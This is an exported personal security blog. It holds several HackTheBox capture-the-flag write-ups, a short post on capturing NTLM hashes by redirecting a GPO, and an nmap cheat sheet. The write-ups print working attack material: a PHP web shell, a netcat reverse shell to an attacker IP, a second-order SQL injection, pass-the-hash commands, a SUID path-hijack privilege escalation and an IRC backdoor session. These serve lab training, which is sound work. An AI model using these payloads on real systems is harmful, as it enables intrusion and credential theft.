up your hostname... [*] 10.10.10.117:6697 - Sending backdoor command... [*] Accepted the first client connection... [*] Accepted the second client connection... [*] Command: echo 4DOoaoPnPoYRBF0P; [*] Writing to socket A [*] Writing to socket B [*] Reading from sockets... [*] Reading from socket A [*] A: \u0026#34;4DOoaoPnPoYRBF0P\\r\\n\u0026#34; [*] Matching... [*] B is input... [*] Command shell session 1 opened (10.10.15.149:4444 -\u0026gt; 10.10.10.117:52871) at 2018-12-24 21:56:58 +0100 Let\u0026rsquo;s get a halfway decent pty shell.\npython3 -c \u0026#39;import pty;pty.spawn(\u0026#34;/bin/bash\u0026#34;)\u0026#39; ircd@irked:~/Unreal3.2$ [Top]\nInternal Recon # Awesome, now we have a shell. Let\u0026rsquo;s find out which users are on this box. And if we can find something usefull.\nircd@irked:~$ ls -la /home drwxr-xr-x 20 djmardov djmardov 4096 Dec 24 15:51 djmardov drwxr-xr-x 4 ircd root 4096 Dec 24 13:17 ircd ircd@irked:~$ cat /etc/passwd djmardov:x:1000:1000:djmardov,,,:/home/djmardov:/bin/bash ircd:x:1001:1001::/home/ircd:/bin/sh ircd@irked:~$ sudo -l bash: sudo: command not found This is just a rough first overview. We probably just have two users on this box. Which typicaly means, we need to privesc to the other user first. Let\u0026rsquo;s check both home folders for more intel before we start spending time on tools like LinEnum.\nircd@irked:/home/djmardov/Documents$ ls -la -rw-r--r-- 1 djmardov djmardov 52 May 16 2018 .backup -rw------- 1 djmardov djmardov 33 May 15 2018 user.txt ircd@irked:/home/djmardov/Documents$ cat .backup Super elite steg backup pw UPupDOWNdownLRlrBAbaSSss Nice! We found a password of some sorts. And also we\u0026rsquo;ve got a hint for what it can be used. However, let\u0026rsquo;s stop here for a second and put this in perspective.\nIt took me just a couple of minutes to find this file. Because I was searching for the user.txt which you is right next to the backup file. (User.txt isn\u0026rsquo;t accessible for us as you can see.)\nHowever I wasn\u0026rsquo;t sure what to do with it. \u0026ldquo;Steg\u0026rdquo; is a reference for \u0026ldquo;Stegonography\u0026rdquo; that\u0026rsquo;s for sure. But there\u0026rsquo;s nothing where to put the password. I searched everywhere in the filesystem. After quite some time I took a break thought:\nWhere is typicaly some stego hidden? Well, pictures. But I don\u0026rsquo;t have a picture. \u0026hellip;except the one on the Website!\nDamn! This took me way to long. So, what next? I downloaded the picture and installed a famous tool I knew from other \u0026ldquo;Stego\u0026rdquo; Challenges called \u0026ldquo;StegHide\u0026rdquo;.\nroot@kali:~# steghide extract -sf irked.jpg Enter passphrase: wrote extracted data to \u0026#34;pass.txt\u0026#34;. root@kali:~# cat pass.txt Kab6h+m+bbp2J:HG Awesome! We\u0026rsquo;ve got another password. Since we found it in \u0026ldquo;djmardov\u0026rdquo; directory let\u0026rsquo;s check if it\u0026rsquo;s a password for \u0026ldquo;ssh\u0026rdquo;.\n[Top]\nUser Flag # ssh djmardov@10.10.10.117 Password: djmardov@irked:~$ cat Documents/user.txt 4a66a78b12dc0e************ Awesome. We are not only authenticated as a propper user, we also can get the \u0026ldquo;userflag\u0026rdquo; now.\n[Top]\nPrivilege Escalation # Let\u0026rsquo;s hunt for the \u0026ldquo;rootflag\u0026rdquo;. I start with downloading \u0026ldquo;LinEnum.sh\u0026rdquo; from my attacker machine. I start a local webserver using python3.\nAttacker # python3 -m http.server 80\nVictim # djmardov@irked:/tmp$ wget http://10.10.15.149/LinEnum.sh 2018-12-24 17:42:34 (1.45 MB/s) - \u0026#39;LinEnum.sh\u0026#39; saved [45578/45578] djmardov@irked:/tmp$ chmod +x LinEnum.sh djmardov@irked:/tmp$ ./LinEnum.sh -t This is part of the relevant output. I noticed the program \u0026ldquo;viewuser\u0026rdquo;. Which has the SUID bit set. Why this program? It\u0026rsquo;s not installed on Linux by default. If you don\u0026rsquo;t know this, you only can compare a Linux install with this one.\n[-] SUID files: -rwsr-xr-x 1 root root 53112 May 17 2017 /usr/bin/passwd -rwsr-xr-x 1 root root 52344 May 17 2017 /usr/bin/chfn -rwsr-xr-x 1 root root 7328 May 16 2018 /usr/bin/viewuser -rwsr-xr-x 1 root root 96760 Aug 13 2014 /sbin/mount.nfs -rwsr-xr-x 1 root root 38868 May 17 2017 /bin/su -rwsr-xr-x 1 root root 34684 Mar 29 2015 /bin/mount Let\u0026rsquo;s run the programm an check what it does.\ndjmardov@irked:/usr/bin$ ./viewuser This application is being devleoped to set and test user permissions It is still being actively developed (unknown) :0 Dec 24 17:20 (:0) djmardov pts/0 Dec 24 17:27 (10.10.14.250) djmardov pts/1 Dec 24 17:37 (10.10.15.149) djmardov pts/3 Dec 24 17:45 (10.10.15.234) sh: 1: /tmp/listusers: not found So, it says it\u0026rsquo;s in development and should set and test user permissions. But it seems, it ran into an error because the file /tmp/listuser is missing.\nWell, let\u0026rsquo;s create one. But put some cool content in there. ;)\ndjmardov@irked:/usr/bin$ echo /bin/bash \u0026gt; /tmp/listusers djmardov@irked:/usr/bin$ chmod 777 /tmp/listusers djmardov@irked:/usr/bin$ ./viewuser This application is being devleoped to set and test user permissions It is still being actively developed (unknown) :0 Dec 24 17:20 (:0) djmardov pts/0 Dec 24 17:27 (10.10.14.250) djmardov pts/1 Dec 24 17:37 (10.10.15.149) djmardov pts/3 Dec 24 17:45 (10.10.15.234) djmardov pts/5 Dec 24 17:53 (10.10.12.6) root@irked:/usr/bin# Aaand we are root! =)\n[Top]\nRoot Flag # So all that is left, is to get the rootflag.\nroot@irked:# cat /root/root.txt 8d8e9e8be6465*********** This is a box done!\n[Top]\nLessons Learned # I always forget to either scan for all ports or UDP ports when I can\u0026rsquo;t find a first entry point. This was my initial problem with this box. I had to go to the forums to get a hint. Which could have been avoided.\nSo, what I did is to automate my nmap scan. I just wrote a simple python3 wrapper around nmap. The UDP scan takes ages to complete btw, so I put it last. You can find it here on my Github page.\nTo cite ippsec:\n\u0026ldquo;It\u0026rsquo;s always good to have some recon running in the background.\u0026rdquo;\nThat\u0026rsquo;s all for today. Have a good one!\nx41\n[Top]\n"},{"id":13,"href":"/posts/gettinghashes/","title":"NTLM Hashes via GPO redirect","section":"Blog","content":" A couple of days ago Darren Mar-Elia tweeted about sending gpos down the wrong path. More security fun with GPOs :) : https://t.co/wEJhjn9uT5 #grouppolicy #infosec\n\u0026mdash; Darren Mar-Elia (@grouppolicyguy) April 3, 2019 You should read his article before we move on here.\nAfter I was done I thought: \u0026ldquo;If an attacker can redirect the GPO to a SMB-Share, shouldn\u0026rsquo;t he be able to use tools like impacket\u0026rsquo;s SMB-Server to capture all the NTML hashes in a domain? Let\u0026rsquo;s try that.\nMy setup contained a simple domain with one Domain Controller, User and Client. For the attacker-machine I used my Kali Linux. I started impacket\u0026rsquo;s SMB-Server and pointed the GPO to it by changing \u0026ldquo;gPCFileSysPath\u0026rdquo;.\nThen I tried to view the GPO-Settings again and indeed got the NTLM Hash of the Domain-Admin.\nThe next thing I focused on was the behavior of the clients / users that get the GPO. Will they sent us the hash aswell? Well - in my short test I wasn\u0026rsquo;t able to get any user hashes - but the Computer-Account as seen in the picture after issuing a gpupdate /force. The same would happen on a reboot.\nI searched for attacks someone could pull of with the Machine-NTLM-Hash and found those:\nblog.secarma.co.uk adsecurity.org\nThis attack-vector might be of limited use because you need write-access to the GPO in the first place. But it was a nice and simple research project for me.\nTake care!\nx41\n"},{"id":14,"href":"/posts/stratosphere/","title":"Stratosphere - WriteUp [Video]","section":"Blog","content":" I made this video way back in 2018 for a company meeting. I tried to give even non-technical people a sense of how an attack is carried out. I put it on the HackTheBox Forums a couple weeks ago and decided to get it on my website too.\nHave fun watching it!\nx41\n"},{"id":15,"href":"/posts/access/","title":"Access - WriteUp","section":"Blog","content":" External Recon # We kick off a basic \u0026ldquo;nmap\u0026rdquo; scan:\nnmap -sC -sV 10.10.10.98 PORT STATE SERVICE VERSION 21/tcp open ftp Microsoft ftpd 23/tcp open telnet? 80/tcp open http Microsoft IIS httpd 7.5 Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows As you can see, we find some very common ports. When we visit the website listening on \u0026ldquo;port 80\u0026rdquo; we just find a picture of a server-room.\nLet\u0026rsquo;s check \u0026ldquo;ftp\u0026rdquo; and \u0026ldquo;telnet\u0026rdquo; by running another \u0026ldquo;nmap\u0026rdquo; scan.\nnmap -A 10.10.10.98 PORT STATE SERVICE VERSION 21/tcp open ftp Microsoft ftpd | ftp-anon: Anonymous FTP login allowed (FTP code 230) |_Can\u0026#39;t get directory listing: PASV failed: 425 Cannot open data connection. | ftp-syst: |_ SYST: Windows_NT 23/tcp open telnet? 80/tcp open http Microsoft IIS httpd 7.5 | http-methods: |_ Potentially risky methods: TRACE |_http-server-header: Microsoft-IIS/7.5 First thing to note is that we have anonymous access to the \u0026ldquo;ftp\u0026rdquo; server. Let\u0026rsquo;s login an see what we find.\n[Top]\nExplore # ftp 10.10.10.98 Name (10.10.10.98:root): anonymous 331 Anonymous access allowed, send identity (e-mail name) as password. Password: 230 User logged in. Remote system type is Windows_NT. ftp\u0026gt; dir 08-23-18 08:16PM \u0026lt;DIR\u0026gt; Backups 08-24-18 09:00PM \u0026lt;DIR\u0026gt; Engineer In both directories are files. I downloaded them with get \u0026lt;filename\u0026gt;.\nThe zip file was password protected. So, I moved over to the database file. I ran the tool \u0026ldquo;strings\u0026rdquo; and \u0026ldquo;grep\u0026rdquo; on it and hoped for a quick win. Perhaps we find a password.\nAnd indeed I found a password to the zip:\nstrings backup.mdb | grep access access4u@security Of cause I tried different versions of this. grep passw and others. To be honest. I don\u0026rsquo;t know what else I tried. Perhaps I just piped \u0026ldquo;strings\u0026rdquo; into \u0026ldquo;more\u0026rdquo; and searched manually. ;)\nHowever in the zip file, I found a \u0026ldquo;.pst\u0026rdquo; file. If you don\u0026rsquo;t know what this is, you can run file against it and find out it\u0026rsquo;s a \u0026ldquo;Microsoft Exchange\u0026rdquo; format for Mailboxes.\nWe can\u0026rsquo;t read it how it is right now. So I searched for a converter. Very quickly I came across \u0026ldquo;pst-tools\u0026rdquo;. You can get them via \u0026ldquo;apt\u0026rdquo; in \u0026ldquo;kali\u0026rdquo;.\nAfter installing it, I ran readpst. It converted the file to a \u0026ldquo;.mbox\u0026rdquo; file. You can get the file here.\nIn it you find an email from John.\nHi there,\nThe password for the “security” account has been changed to 4Cc3ssC0ntr0ller. Please ensure this is passed on to your engineers.\nRegards, John\nHow kind! Thanks John! :)\n[Top]\nExploit # Let\u0026rsquo;s login with our new credentials:\nAnd we\u0026rsquo;ve got a shell. Including user.txt\nC:\\Users\\security\\Desktop\u0026gt;dir Volume in drive C has no label. Volume Serial Number is 9C45-DBF0 Directory of C:\\Users\\security\\Desktop 08/28/2018 06:51 AM \u0026lt;DIR\u0026gt; . 08/28/2018 06:51 AM \u0026lt;DIR\u0026gt; .. 08/21/2018 10:37 PM 32 user.txt 1 File(s) 32 bytes 2 Dir(s) 16,767,012,864 bytes free [Top]\nInternal Recon # I searched around in the box for clues how to proceed. Eventually I checked for stored credentials:\ncmdkey /list Currently stored credentials: Target: Domain:interactive=ACCESS\\Administrator Type: Domain Password User: ACCESS\\Administrator If you want to learn more about \u0026ldquo;Windows Enumeration\u0026rdquo; check this blog. He has some HackTheBox WriteUps too.\n[Top]\nPrivilege Escalation # In order to use those stored credentials, I used \u0026ldquo;runas\u0026rdquo; with the \u0026ldquo;/savecreds\u0026rdquo; option.\nrunas /user:ACCESS\\Administrator /savecred \u0026quot;cmd.exe /c type c:\\users\\administrator\\desktop\\root.txt C:\\Users\\security\\AppData\\Local\\Temp\\root.txt\u0026quot;\n[Top]\nRoot Flag # So we\u0026rsquo;ve got our root.txt:\nBut getting a shell is fun. At least when you don\u0026rsquo;t do a writeup. For some reason my payloads wouldn\u0026rsquo;t work anymore. So I had to figure out another way to get a shell.\nI won\u0026rsquo;t give you the complete rundown today. I probably will do a seperate blog for different shells in the near future. Just get yourself this repo: Github: nishang and play with \u0026ldquo;Invoke-PowershellTCP\u0026rdquo;. It\u0026rsquo;s cool! :)\n[Top]\nLessons Learned # I should learn to take propper notes on my machines. I had to do the machine a second time basicly. sigh\nThat\u0026rsquo;s it for today. Have a nice one!\nx41\n[Top]\n"},{"id":16,"href":"/posts/ypuffy/","title":"Ypuffy - WriteUp","section":"Blog","content":" External Recon # Let\u0026rsquo;s start with nmap. But let\u0026rsquo;s spice it up a bit with an additional script:\nnmap -sC -sV -oN initial --script discovery 10.10.10.107\nThe output is quite big. You can the output here.\nThe script tries to get as much information as possible of your target and in this case shows some LDAP information and the following open ports:\nOpen Ports 22, 80, 139, 389, 445 [Top]\nExplore # The sambaNTPassword Hash immediately caught my attention.\nsambaNTPassword: 0B186E661BBDBDCF6047784DE8B9FD8B As this is very juicy information. I paused my enumeration and tried to exploit this. But how?\nPassword hashes are often used as a substitude to passwords. Which means, you don\u0026rsquo;t need the original password to authenticate to a service. Just the hash. This is how your corporate single-sign-on stuff works. Otherwise you would have to login every time. So it\u0026rsquo;s a convenience thing.\nThe method is called Pass-The-Hash. And of cause there are tools out there, that help you with this. Like: pth-smbclient. If you don\u0026rsquo;t have it, just got to github and get the pth-toolkit.\n[Top]\nExploit # After fiddeling around with the options, syntax and where to connect to I managed to connect to alice share:\npth-smbclient --user=alice1978 --pw-nt-hash -m smb3 \\\\\\\\10.10.10.107\\\\alice 0B186E661BBDBDCF6047784DE8B9FD8B\nAnd we find a private key in \u0026ldquo;ppk\u0026rdquo; format.\nAfter downloading the file, and trying to use it as a key to access ssh I got an error. This format is not compatible with ssh. So, I tried converting it. A quick googlesearch helped me finding the correct command for this task. But first we need to install putty-tools.\nputtygen my_private_key.ppk -O private-openssh -o id_rsa mv ~/.ssh chmod 600 id_rsa ssh -i id_rsa alice1978@10.10.10.107 [Top]\nUser Flag # As you can see in the screenshot. A simple ls gives us the \u0026ldquo;user.txt\u0026rdquo;.\n[Top]\nInternal Recon # A quick uname -a reveals a BSD box. Which was quite handy. Shortly after this box was released an exploit for the XORG component of most BSD boxes was published. It\u0026rsquo;s local privesc which gives you root access. This is something you only get by googleing or being up-to-date with infosec news. This was the route I took to root the box.\nHowever the intended method was a bit more tricky. While searching the directory structure I noticed a folder \u0026ldquo;userca\u0026rdquo;.\n\u0026ldquo;CA\u0026rdquo; in this context mostly means \u0026ldquo;Certificate Authority\u0026rdquo; and is there to sign certificates or issue new keys. Let\u0026rsquo;s say: \u0026ldquo;ssh\u0026rdquo;.\nFurthermore BSD has something like sudo, called doas. Let\u0026rsquo;s check what we can do on this box.\nypuffy$ cat /etc/doas.conf permit keepenv :wheel permit nopass alice1978 as userca cmd /usr/bin/ssh-keygen We indeed can run ssh-keygen. But when we try, we are prompted for a password. Let\u0026rsquo;s dig deeper in the ssh route. There\u0026rsquo;s a password somewhere for sure.\nypuffy$ cat sshd_config [...] AuthorizedPrincipalsCommand /usr/local/bin/curl http://127.0.0.1/sshauth?type=principals\u0026amp;username=%u So, apparently we can issue a curl to the \u0026ldquo;CA\u0026rdquo;\u0026hellip;I guess, not sure what happens here. I still need to look this up\u0026hellip;\n[Top]\nPrivilege Escalation # Let\u0026rsquo;s step back and catch up with the XORG exploit first. The exploit is fairly easy to use. Just get it from Exploit-db. It\u0026rsquo;s very easy to use.\nDownload chmod +x run root Let\u0026rsquo;s get back to the curl command and check what we can do with it:\nypuffy$ /usr/local/bin/curl \u0026#34;http://127.0.0.1/sshauth?type=principals\u0026amp;username=root\u0026#34; 3m3rgencyB4ckd00r For whatever reason we get this string back: 3m3rgencyB4ckd00r - obviously the missing password. Let\u0026rsquo;s create a key and try signing it.\nypuffy$ ssh-keygen -t rsa ypuffy$ mv id_rsa.pub /tmp ypuffy$ doas -u userca /usr/bin/ssh-keygen -s /home/userca/ca -n 3m3rgencyB4ckd00r -I \u0026#34;algo\u0026#34; -z 1 id_rsa.pub Signed user key id_rsa-cert.pub: id \u0026#34;algo\u0026#34; serial 1 for 3m3rgencyB4ckd00r valid forever ypuffy$ cp id_rsa-cert.pub /home/alice1978/.ssh/ This seems to work so far. But can we login now?\n[Top]\nRoot Flag # ypuffy$ ssh root@localhost OpenBSD 6.3 (GENERIC) #100: Sat Mar 24 14:17:45 MDT 2018 ypuffy# id uid=0(root) gid=0(wheel) groups=0(wheel), 2(kmem), 3(sys), 4(tty), 5(operator), 20(staff), 31(guest) ypuffy# ls root.txt This is it. We got the box. =)\nSee ya next time!\nx41\n[Top]\n"},{"id":17,"href":"/posts/secnotes/","title":"SecNotes - WriteUp","section":"Blog","content":" External Recon # As usual we start with our nmap scan and see what we are dealing with:\nnmap -sC -sV 10.10.10.97 PORT STATE SERVICE VERSION 80/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) 445/tcp open microsoft-ds Windows 10 Enterprise 17134 microsoft-ds (workgroup: HTB) Service Info: Host: SECNOTES; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: mean: 2h40m00s, deviation: 4h37m08s, median: 0s | smb-os-discovery: | OS: Windows 10 Enterprise 17134 (Windows 10 Enterprise 6.3) | OS CPE: cpe:/o:microsoft:windows_10::- | Computer name: SECNOTES | NetBIOS computer name: SECNOTES\\x00 | Workgroup: HTB\\x00 |_ System time: 2019-01-04T05:21:46-08:00 | smb-security-mode: | account_used: \u0026lt;blank\u0026gt; | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) | smb2-security-mode: | 2.02: |_ Message signing enabled but not required | smb2-time: | date: 2019-01-04 14:21:48 |_ start_date: N/A So Port 80 \u0026amp; 445 are open. While I explored those, I scanned all TCP Ports to see if there\u0026rsquo;s more to find. Nmap by default just checks the Top1000.\nSpoileralert: I found Port 8808 to be open also.\n[Top]\nExplore # Port 445 # Nothing too interessting.\nPort 8808 # Just the default IIS Webserver Page. Nothing fancy here.\nPort 80 # We find a login page. I first tried to login with the usual supects.\nadmin:admin admin:toor root:toor etc. No luck so far. But if you look closely, there\u0026rsquo;s an option to register an account. Let\u0026rsquo;s try that.\nThat worked - let\u0026rsquo;s login.\nWe see a page where we are able to take up to 3 notes and store them and also delete them. Also we get another piece of intel. Can you spot it? Take your time and try to find it.\nCorrect it\u0026rsquo;s the name \u0026ldquo;tyler\u0026rdquo; in the email-address. Perhaps this could be usefull later.\nI checked all the functions the site had to offer, and noticed this URL when deleting a note:\nhttp://10.10.10.97/home.php?action=delete\u0026amp;id=31\nWe can see the \u0026ldquo;home.php\u0026rdquo; script has a parameter to offer. I started playing with it. With \u0026ldquo;wfuzz\u0026rdquo; to find other parameters but had no luck finding a vulnerability there.\nSo I started up \u0026ldquo;gobuster\u0026rdquo; and found a file called \u0026ldquo;db.php\u0026rdquo;. Based on the name \u0026ldquo;db\u0026rdquo; is assumed that all our notes are stored in a database.\nAs there was nothing else I could find, I thought maybe some kind of \u0026ldquo;SQLi\u0026rdquo; is possible. Although I am not very experienced with \u0026ldquo;SQLi\u0026rdquo; I jumped right in and fired up \u0026ldquo;SQLMap\u0026rdquo;.\nI won\u0026rsquo;t give you all the things I tried. I spent at least and hour or two but nothing came up. So I was stuck. After checking the HackTheBox forums for a hint, someone mentioned that his type of vulnerability was part of a retired box called \u0026ldquo;nightmare\u0026rdquo;.\nI had the video-solution of \u0026ldquo;nightmare\u0026rdquo;, created by the awesome guy \u0026ldquo;ippsec\u0026rdquo;, already downloaded on my laptop. So I watched it again just to learn it was indeed about \u0026ldquo;SQLi\u0026rdquo;. Specificaly \u0026ldquo;2nd order SQLi\u0026rdquo;. You should watch (and subscribe!) his video for a better explaination on this type of \u0026ldquo;SQLi\u0026rdquo;.\nSo let\u0026rsquo;s try some handcrafted \u0026ldquo;SQLi\u0026rdquo;.\n[Top]\nWeaponize # So, we could login with our regular user. First, let\u0026rsquo;s logout and create another user like so:\nAfter logging in we get an error!\nWhich means, something broke because of the single-quote we had in our username. Let\u0026rsquo;s try to fix that. I commented everything out after the quote.\nNice - we are able to login again. But wait, something is wrong here:\nWe can see the note from the legitmate \u0026ldquo;x41\u0026rdquo; User. We can read other users content!\nThis works because the \u0026ldquo;SQL\u0026rdquo; query to get the notes from the database looks probably like this:\nselect * from NOTES where USERNAME like '$User'\nKeep those two single-quotes in mind.\nOur \u0026ldquo;SQLi\u0026rdquo; did this to the statement:\nselect * from NOTES where USERNAME like 'x41'-- -'\nAs you can see, there are now three single-quotes. The 2nd one was part of the name we provided. But as we commented the original one out, we have now a valid statement with the already existing useraccount \u0026ldquo;x41\u0026rdquo; (without the single-quote).\nNice! You know what we need to do next, do you?! ;)\n[Top]\nExploit # Let\u0026rsquo;s create another user, hmm, let\u0026rsquo;s target \u0026ldquo;tyler\u0026rdquo; as he seems to be an admin of some sorts.\nAnd after logging in we find something nice in his notes. :)\nNow we can try to connect to the SMB share with those credentials.\nAnd there\u0026rsquo;s the webroot the IIS Server.\nThe note says, this is supposed to be the new website. The old one is based on \u0026ldquo;php\u0026rdquo;. Perhaps PHP is working on there too?\nI uploaded a simple \u0026ldquo;php\u0026rdquo; command-shell and tried it.\n\u0026lt;?php if (isset($_REQUEST[\u0026#39;fexec\u0026#39;])) { echo \u0026#34;\u0026lt;pre\u0026gt;\u0026#34; . shell_exec($_REQUEST[\u0026#39;fexec\u0026#39;]) . \u0026#34;\u0026lt;/pre\u0026gt;\u0026#34;; }; ?\u0026gt; =) Let\u0026rsquo;s get a reverse-shell!\nAt first I used \u0026ldquo;nc.exe\u0026rdquo;, but soon remembered it\u0026rsquo;s a Windows 10 box, running a 64Bit OS. If you start a 32Bit executable on a 64Bit OS, you get a different environment. A different registry and some programs won\u0026rsquo;t work. So I switched to \u0026ldquo;nc64.exe\u0026rdquo;.\n\u0026lt;?php echo \u0026#34;Cyber PewPew\u0026#34;; $last_command = system(\u0026#39;nc64.exe 10.10.15.140 4445 -e cmd.exe\u0026#39;,$ret); echo $last_command; echo \u0026#34;\\n ------------------------------- \\n\u0026#34;; echo $ret; ?\u0026gt; We\u0026rsquo;ve got a shell AND\u0026hellip;.\n[Top]\nUser Flag # \u0026hellip;sure enough \u0026ldquo;user.txt\u0026rdquo;! :)\nC:\\inetpub\\new-site\u0026gt;whoami whoami secnotes\\tyler C:\\Users\\tyler\\Desktop\u0026gt;dir Directory of C:\\Users\\tyler\\Desktop 08/19/2018 08:25 AM 34 user.txt [Top]\nInternal Recon # While searching around on the box to find clues on the next step to root.txt, I noticed an \u0026ldquo;Ubuntu\u0026rdquo; archive and a \u0026ldquo;Distros\u0026rdquo; folder. I remember wondering \u0026ldquo;Why is this stuff here?\u0026rdquo; But didn\u0026rsquo;t put 1 + 1 together.\nI had to go back to the forums again to seek out for help. Where someone said:\n\u0026ldquo;What OS Version have you found - there\u0026rsquo;s a specific new feature in this.\u0026rdquo;\nBecause I couldn\u0026rsquo;t think about anything from the top of my head, I googled for the releasenotes. And then it just starred at me:\n\"Windows Subsystem for Linux\" I spent about an hour or so just to learn about this feature, and the tools around it. After that I used \u0026ldquo;wsl.exe\u0026rdquo; and \u0026ldquo;wsl.config\u0026rdquo; to start up the preconfigued \u0026ldquo;Ubuntu\u0026rdquo; Machine.\nHoping for a quick win for root. Perhaps I can read the Windows filesystem from it without \u0026ldquo;ACLs\u0026rdquo; messing with me?\n[Top]\nPrivilege Escalation # \u0026ldquo;Sadly\u0026rdquo; that wasn\u0026rsquo;t possible. I had to search a lot, after a little nudge I headed into the right direction. I just failed to stick to my routine. I guessed my next step instead of doing internal recon properly.\nIf I had done it, I immediately would have tried this:\n[Top]\nRoot Flag # From here it just was connecting to the SMB share to get the root flag. I didn\u0026rsquo;t bother getting a propper shell as admin, which I leave up to the reader how to do that. ;) (Hint: Impacket)\n[Top]\nLessons Learned # First, my \u0026ldquo;Enumeration\u0026rdquo; failed me and I didn\u0026rsquo;t followed my initial thoughts about the Ubuntu folders. On the other hand I got the \u0026ldquo;SQLi\u0026rdquo; right, found the hint about \u0026ldquo;tyler\u0026rdquo; right away. And I learned about \u0026ldquo;wsl\u0026rdquo;. Which is a difficult thing to monitor for \u0026ldquo;blueteams\u0026rdquo;.\nWhile researching this feature I discovered this video from Checkpoint. I recommend watching it.\nThat's it for today. Have a nice one! x41 [Top]\n"},{"id":18,"href":"/docs/cheatsheet/enumeration/nmap/","title":"network","section":"Enumeration","content":" nmap # ##\u0026rsquo; enumerate services and use default scripts\nnmap -sC -sV -oN normal.txt target-ip scan all tcp ports # nmap -p- -oN all_ports.txt target-ip scan all udp ports # nmap -p- -sU -oN all_udp_ports.txt target-ip use script categories # nmap --script vuln,safe,discovery -oN scan.txt target-ip list all nse scripts # ls -lh /usr/share/nmap/scripts/ nmap through socks4 proxy # nmap --proxies socks4://proxy-ip:1080 target-ip ftp bounce scan # nmap -P0 -n -b username:password@target-ip target2-ip --proxies socks4://proxy-ip:1080 -vvvv "}]